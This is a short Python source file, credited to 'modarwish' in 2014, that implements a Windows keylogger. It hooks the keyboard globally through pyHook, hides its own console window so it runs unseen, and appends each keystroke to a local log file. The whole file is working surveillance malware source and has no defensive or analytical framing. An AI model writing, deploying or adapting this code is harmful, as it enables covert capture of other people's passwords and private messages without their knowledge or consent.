#-------------------------------------------------------------------------------
# Name:        SimplePythonKeylogger
# Purpose:
#
# Author:      modarwish
#
# Created:     10/12/2014
# Copyright:   (c) modarwish 2014
# Licence:     <your licence>
#-------------------------------------------------------------------------------

#!/usr/bin/python
import pyHook
import pythoncom
import win32gui
import win32console


log_file = "C:/test/log.txt"                 #log file
window = win32console.GetConsoleWindow()  #script window
win32gui.ShowWindow(window,0)             #window becomes invisible

def pressed_chars(event):       #on they key pressed func
    if event.Ascii:
        f = open(log_file,"a")  # (open log.txt in 'a' mode)
        char = chr(event.Ascii) # (insert real chars in variable)
        if char == "q":         # (if char is a q)
            f.close()           # (close and save the log file)
            exit()              # (exit the program)
        if event.Ascii == 13:   # (if the char is an enter)
            f.write("\n")       # (make a new line)
        f.write(char)           # (write the char)



proc = pyHook.HookManager()      #use pyHook 
proc.KeyDown = pressed_chars     #enable pressed_chars function on the KeyDown event
proc.HookKeyboard()              #initiate the function
pythoncom.PumpMessages()         #wait for input
